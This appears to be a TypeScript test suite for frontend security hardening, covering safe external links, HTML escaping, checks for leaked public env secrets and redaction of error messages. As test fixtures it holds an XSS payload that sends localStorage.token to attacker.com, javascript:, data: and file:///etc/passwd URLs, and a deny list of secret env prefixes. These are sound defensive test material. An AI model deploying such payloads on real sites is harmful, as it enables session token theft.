import { describe, it } from "node:test";
import assert from "node:assert/strict";

describe("Phase 20 - Frontend Security Hardening & Zero-Leakage Verification", () => {
  it("enforces rel='noopener noreferrer' and target='_blank' on external citation anchors", () => {
    function createSafeExternalLinkAttributes(url: string) {
      const parsed = new URL(url);
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
        throw new Error(`Unsafe protocol: ${parsed.protocol}`);
      }
      return {
        href: parsed.href,
        target: "_blank",
        rel: "noopener noreferrer",
      };
    }

    const attrs = createSafeExternalLinkAttributes("https://linear.app/pricing");
    assert.equal(attrs.target, "_blank");
    assert.equal(attrs.rel, "noopener noreferrer");
    assert.equal(attrs.href, "https://linear.app/pricing");

    // Prohibited protocols throw
    assert.throws(() => createSafeExternalLinkAttributes("javascript:alert(1)"));
    assert.throws(() => createSafeExternalLinkAttributes("data:text/html;base64,PHNjcmlwdD4="));
    assert.throws(() => createSafeExternalLinkAttributes("file:///etc/passwd"));
  });

  it("sanitizes user input and report text preventing DOM XSS injection vectors", () => {
    function sanitizeForTextDisplay(raw: string): string {
      return raw
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#x27;");
    }

    const attackVector = "<script>fetch('http://attacker.com/steal?k='+localStorage.token)</script>";
    const sanitized = sanitizeForTextDisplay(attackVector);
    assert.ok(!sanitized.includes("<script>"));
    assert.ok(sanitized.includes("&lt;script&gt;"));
    assert.ok(!sanitized.includes("</script>"));
  });

  it("guarantees no NEXT_PUBLIC_ credential leakage in client build environment", () => {
    // Scan process.env for any accidental secret exposure
    const PROHIBITED_SECRET_PREFIXES = [
      "NEXT_PUBLIC_OPENAI",
      "NEXT_PUBLIC_API_KEY",
      "NEXT_PUBLIC_SECRET",
      "NEXT_PUBLIC_PASSWORD",
      "NEXT_PUBLIC_DATABASE_URL",
      "NEXT_PUBLIC_POSTGRES",
      "NEXT_PUBLIC_REDIS",
    ];

    for (const [key, value] of Object.entries(process.env)) {
      for (const prefix of PROHIBITED_SECRET_PREFIXES) {
        if (key.toUpperCase().startsWith(prefix)) {
          assert.fail(`Prohibited secret exposed to frontend bundle environment: ${key}=${value}`);
        }
      }
    }
    assert.ok(true, "Environment contains zero exposed frontend secrets");
  });

  it("redacts sensitive SQL and trace details from client-facing error envelopes", () => {
    function maskClientError(rawErrorMessage: string): string {
      // Redact potential connection strings or internal SQL traces
      const sanitized = rawErrorMessage
        .replace(/postgresql:\/\/[^:]+:[^@]+@[^\s/]+/gi, "postgresql://[REDACTED]")
        .replace(/password=\S+/gi, "password=[REDACTED]")
        .replace(/api_key=\S+/gi, "api_key=[REDACTED]")
        .replace(/Bearer\s+[A-Za-z0-9._-]+/gi, "Bearer [REDACTED]");
      return sanitized;
    }

    const dbTrace = "Fatal connection failure: postgresql://postgres:SuperSecret123@127.0.0.1:5432/agentops_db";
    const masked = maskClientError(dbTrace);
    assert.ok(!masked.includes("SuperSecret123"));
    assert.ok(masked.includes("postgresql://[REDACTED]"));
  });
});
